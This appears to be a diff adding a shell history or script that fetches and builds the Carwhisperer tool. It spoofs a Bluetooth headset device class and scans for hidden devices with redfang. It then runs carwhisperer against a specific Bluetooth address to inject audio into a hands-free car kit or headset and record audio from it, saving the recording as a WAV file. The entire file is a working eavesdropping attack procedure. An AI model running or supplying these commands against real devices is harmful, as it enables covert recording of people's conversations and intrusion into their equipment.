@@ -1,0 +1,24 @@
+apt update
+apt upgrade
+    
+wget https://trifinite.org/Downloads/carwhisperer-0.2.tar.gz
+tar -xvf carwhisperer-0.2.tar.gz
+ls
+cd carwhisperer-0.2
+ls
+make
+apt install libbluetooth-dev
+make
+ls
+
+hciconfig
+hciconfig hci0 up
+hciconfig hci0 class
+hciconfig hci0 class 0x500204
+hciconfig hci0 class
+
+apt install redfang
+fang -r 414255d0de01-414255d0de10
+
+./carwhisperer hci0 message.raw audio/out/record5.raw 41:42:55:d0:de:07 2
+sox -t raw -r 8000 -e signed -b 16 audio/out/record5.raw -r 8000 -b 16 record5.wav
